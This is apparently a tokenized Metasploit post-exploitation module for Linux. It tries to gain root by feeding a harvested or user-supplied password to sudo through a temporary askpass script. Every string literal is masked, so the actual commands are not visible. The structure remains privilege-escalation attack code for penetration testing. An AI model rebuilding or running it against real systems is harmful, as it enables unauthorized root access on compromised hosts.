require <str> require <str> class Metasploit3 < Msf :: Post include Msf :: Post :: File include Msf :: Post :: Linux :: Priv include Msf :: Post :: Linux :: System def initialize ( info = { } ) super ( update_info ( info , <str> = > <str> , <str> = > <str> , <str> = > MSF_LICENSE , <str> = > [ <str> , <str> ] , <str> = > <str> , <str> = > [ [ <str> , <str> ] ] , <str> = > [ <str> ] ) ) register_options ( [ OptString . new ( <str> , [ false , <str> ] ) ] , self . class ) end def run print_status ( <str> ) sudo_bin = cmd_exec ( <str> ) if is_root? print_status <str> return end if sudo_bin . empty? print_error <str> return end get_root ( ) end def get_root if datastore [ <str> ] password = datastore [ <str> ] else password = session . exploit_datastore [ <str> ] end if password . to_s . empty? print_status <str> else print_status <str> password <str> end askpass_sudo ( password ) unless is_root? print_error <str> else print_good <str> report_note ( <str> = > session , <str> = > <str> , <str> = > <str> session . exploit_datastore [ <str> ] <str> ) end end def askpass_sudo ( password ) if password . to_s . empty? begin :: Timeout . timeout ( <int> ) do cmd_exec ( <str> ) end rescue :: Timeout :: Error print_error <str> rescue print_error <str> end else askpass_sh = <str> + Rex :: Text . rand_text_alpha ( <int> ) begin :: Timeout . timeout ( <int> ) do vprint_status <str> askpass_sh <str> cmd_exec ( <str> askpass_sh <str> ) cmd_exec ( <str> password <str> askpass_sh <str> ) vprint_status <str> cmd_exec ( <str> askpass_sh <str> ) vprint_status <str> cmd_exec ( <str> askpass_sh <str> ) cmd_exec ( <str> askpass_sh <str> ) vprint_status <str> cmd_exec ( <str> ) end rescue :: Timeout :: Error print_error <str> rescue print_error <str> end end end def askpass_cleanup ( askpass_sh ) begin :: Timeout . timeout ( <int> ) do vprint_status <str> cmd_exec ( <str> askpass_sh <str> ) end rescue :: Timeout :: Error print_error <str> end end end 
